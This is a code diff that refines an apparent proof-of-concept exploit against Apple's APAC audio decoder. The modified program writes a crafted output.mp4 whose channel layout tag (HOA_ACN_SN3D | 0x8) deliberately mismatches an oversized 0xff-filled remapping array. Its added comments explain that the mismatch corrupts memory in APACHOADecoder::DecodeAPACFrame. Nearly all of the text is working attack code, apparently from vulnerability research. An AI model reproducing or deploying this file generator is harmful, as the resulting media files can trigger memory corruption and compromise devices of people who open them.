@@ -11,26 +11,33 @@ struct CodecConfig {
 };
 
 void OverrideApac(CodecConfig* config) {
-  config->remappingChannelLayout->mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | 0xffff;
+  //The mRemappingArray is sized based on the lower two bytes of mChannelLayoutTag.
+  //By creating a mismatch between them, a later stage of processing in APACHOADecoder::DecodeAPACFrame is corrupted.
+  //When the APACHOADecoder goes to process the APAC frame, for some reason it uses a permutation map that is the size given here in 
+  //mChannelLayoutTag, rather than just based on m_totalComponents. 
+  config->remappingChannelLayout->mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x8;
+  
   for (int i = 0; i < 0x10000; i++) {
     config->mRemappingArray.push_back(0xff);
   }
 }
 
 int main() {
+  //This is the number of channels
+  uint32_t channelNum = 1;
   AVAudioFormat* formatIn = [[AVAudioFormat alloc] initStandardFormatWithSampleRate:44100
-                                                                           channels:1];
+                                                                           channels:channelNum];
   AudioStreamBasicDescription outputDescription{.mSampleRate = 44100,
                                                 .mFormatID = kAudioFormatAPAC,
                                                 .mFormatFlags = 0,
                                                 .mBytesPerPacket = 0,
                                                 .mFramesPerPacket = 0,
                                                 .mBytesPerFrame = 0,
-                                                .mChannelsPerFrame = 4,
+                                                .mChannelsPerFrame = channelNum,
                                                 .mBitsPerChannel = 0,
                                                 .mReserved = 0};
   AVAudioChannelLayout* channelLayout =
-      [AVAudioChannelLayout layoutWithLayoutTag:kAudioChannelLayoutTag_HOA_ACN_SN3D | 4];
+      [AVAudioChannelLayout layoutWithLayoutTag:kAudioChannelLayoutTag_HOA_ACN_SN3D | 1];
 
   NSURL* outUrl = [NSURL fileURLWithPath:@"output.mp4"];
 
@@ -44,7 +51,6 @@ int main() {
     fprintf(stderr, "error creating file: %x\n", status);
     return 1;
   }
-  float audioBuffer[44100] = {};
 
   status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientDataFormat,
                                    sizeof(AudioStreamBasicDescription), formatIn.streamDescription);
@@ -58,7 +64,10 @@ int main() {
     fprintf(stderr, "error writing audiofile: %x\n", status);
     return 1;
   }
-
+  float audioBuffer[44100];
+  for (int i = 0; i < 44100; ++i) {
+      audioBuffer[i] = 0.5f;
+  }
   AudioBufferList audioBufferList{
       .mNumberBuffers = 1,
       .mBuffers =
